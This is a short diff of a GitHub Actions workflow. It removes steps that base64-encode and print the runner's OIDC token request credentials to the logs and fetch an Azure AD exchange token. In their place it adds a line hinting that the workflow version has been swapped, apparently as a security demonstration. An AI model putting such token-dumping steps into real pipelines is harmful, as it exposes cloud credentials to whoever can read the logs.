@@ -27,7 +27,5 @@ jobs:
     steps:
       # Runs a set of commands using the runners shell
       - run: |
-          echo "A  $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | base64
-          echo "R  $ACTIONS_ID_TOKEN_REQUEST_URL"
-          curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"
+          echo "I'm not the version you think I am"
 
